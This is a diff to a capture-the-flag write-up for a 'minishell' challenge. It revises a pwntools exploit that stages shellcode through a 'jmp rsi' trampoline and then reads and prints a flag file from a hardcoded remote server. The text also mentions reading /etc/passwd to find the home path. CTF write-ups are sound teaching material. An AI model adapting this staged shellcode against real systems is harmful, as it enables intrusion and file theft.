@@ -54,8 +54,9 @@ So let's check wich flags we have available to use the syscall correctly and get
 #define PROT_SEM	0x8		/* page may be used for atomic ops */
 #define PROT_NONE	0x0		/* page can not be accessed */
 ```
-A PROT_SEM flag. Interesting. So setting rdx = 15 would work, we could read 3 more Bytes and overwrite our whole current shellcode + 3.
-Those additional 3 Bytes are sufficient to do a `jmp rsi`. from there on it is a piece of cake, with that space for shellcode available, we can read an arbitrary amount of shellcode into memory.
+A PROT_SEM flag. Interesting. So setting rdx = 15 would work, we could read 3 additional Bytes and overwrite our whole current shellcode + 3.
+Those additional 3 Bytes are sufficient to do a `jmp rsi`.
+From there on it is a piece of cake, with that much space available, we can read an arbitrary amount of shellcode into memory and finally get our flag.
 
 Full exploit code:
 ```python
@@ -83,16 +84,16 @@ stage2 = """
 """
 stage2 = asm(stage2)
 assert len(stage2) <= 12
-stage2 = stage2.ljust(12, '\x90') + asm('jmp rsi')
+stage2 = stage2.ljust(12, asm('nop')) + asm('jmp rsi')
 assert len(stage2) <= 15
 
 stage3 = "nop\n" * 15
 stage3 += pwnlib.shellcraft.open('/home/minishell/flag.txt')
-stage3 += pwnlib.shellcraft.read(fd='rax', count=0x1000)
-stage3 += pwnlib.shellcraft.strlen('rsp')
-stage3 += pwnlib.shellcraft.write(1, 'rsp', 'rcx')
+stage3 += pwnlib.shellcraft.read('rax', 'rsp', 0x1000)
+stage3 += pwnlib.shellcraft.write(1, 'rsp', 'rax')
 stage3 = asm(stage3)
 
+# r = remote('localhost', 6666)
 r = remote('200.136.252.34', 4545)
 if __name__ == '__main__':
     r.recvuntil('? ')
@@ -102,5 +103,6 @@ if __name__ == '__main__':
     r.send(stage3)
     r.interactive()
     # CTF-BR{s0000_t1ght_f0r_my_B1G_sh3ll0dE_}
+
 ```
 The PATH wasn't set, so just opening `flag.txt` did not work. Had to read `/etc/passwd` to find out the home path.
